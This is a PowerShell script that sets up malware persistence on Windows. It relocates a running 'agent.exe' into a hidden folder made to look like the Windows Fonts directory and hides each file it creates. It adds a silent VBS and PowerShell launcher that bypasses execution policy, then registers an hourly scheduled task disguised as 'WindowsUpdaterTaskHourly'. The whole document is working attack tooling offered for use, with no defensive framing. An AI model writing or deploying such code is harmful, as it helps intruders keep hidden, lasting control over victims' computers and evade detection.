$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'

# -------------------------------------------------------------------
# 1. Get the running agent.exe process
# -------------------------------------------------------------------
$proc = Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $proc) {
    Write-Output "ERROR: No running agent.exe found. Start your agent first."
    exit 1
}
$sourcePath = $proc.Path
Write-Host "[+] Found agent.exe (PID: $($proc.Id)) at: $sourcePath"

# -------------------------------------------------------------------
# 2. Stop the agent so we can copy it
# -------------------------------------------------------------------
Write-Host "[+] Stopping agent (PID $($proc.Id)) to copy file..."
Stop-Process -Id $proc.Id -Force
Start-Sleep -Seconds 1

# -------------------------------------------------------------------
# 3. Copy agent to hidden fonts folder
# -------------------------------------------------------------------
$hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $hideDir)) {
    New-Item -ItemType Directory -Path $hideDir -Force | Out-Null
    attrib +h $hideDir
    Write-Host "[+] Created hidden folder: $hideDir"
}

$agentFile = "$hideDir\agent.exe"
# Remove old if exists
if (Test-Path $agentFile) { Remove-Item $agentFile -Force }
Copy-Item -LiteralPath $sourcePath -Destination $agentFile -Force
attrib +h $agentFile
Write-Host "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"

# -------------------------------------------------------------------
# 4. Create run.ps1 (kills any agent then starts the hidden one)
# -------------------------------------------------------------------
$runPs1 = "$hideDir\run.ps1"
$ps1Content = @"
`$ProgressPreference = 'SilentlyContinue'
`$target = '$agentFile'

# Kill any remaining agent.exe processes
Get-Process -Name "agent" -ErrorAction SilentlyContinue | ForEach-Object {
    Stop-Process -Id `$_.Id -Force
}
Start-Sleep -Seconds 1
Start-Process -WindowStyle Hidden -FilePath `$target
"@
Set-Content -Path $runPs1 -Value $ps1Content -Encoding ASCII -Force
attrib +h $runPs1
Write-Host "[+] Created $runPs1"

# -------------------------------------------------------------------
# 5. Create run.vbs (silent launcher)
# -------------------------------------------------------------------
$runVbs = "$hideDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$runPs1""", 0, False
"@
Set-Content -Path $runVbs -Value $vbsContent -Encoding ASCII -Force
attrib +h $runVbs
Write-Host "[+] Created $runVbs"

# -------------------------------------------------------------------
# 6. Create scheduled task (every 1 hour)
# -------------------------------------------------------------------
$taskName = "WindowsUpdaterTaskHourly"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$runVbs`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Scheduled task '$taskName' created (runs every hour)"
} else {
    Write-Output "ERROR: Task creation failed"
    exit 1
}

# -------------------------------------------------------------------
# 7. Start the agent from the fonts folder now
# -------------------------------------------------------------------
Write-Host "`n[*] Starting agent from hidden folder..."
Start-Process -WindowStyle Hidden -FilePath $agentFile
Start-Sleep -Seconds 2
$newProc = Get-Process -Name "agent" -ErrorAction SilentlyContinue
if ($newProc) {
    Write-Host "✅ Agent is now running from: $($newProc.Path)"
} else {
    Write-Host "⚠️ Agent did not start automatically. It will run at the next scheduled hour."
}

Write-Host "`n✅ PERSISTENCE COMPLETE"
Write-Host "Agent location: $agentFile (hidden)"
Write-Host "Scheduled task '$taskName' runs every hour"
